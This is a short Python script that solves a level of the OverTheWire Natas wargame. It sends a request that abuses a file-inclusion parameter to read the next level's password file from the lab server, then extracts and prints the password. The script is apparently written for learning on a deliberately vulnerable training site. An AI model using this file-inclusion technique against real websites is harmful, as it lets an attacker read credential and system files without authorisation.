#! /usr/bin/python

import requests
import re

username = 'natas7'
password = ''

r = requests.get('http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8', auth=(username, password))
pattern = r'<br>\s*(\w+)\s*<!--'
result = re.search(pattern, str(r.content))

print result.group(1)

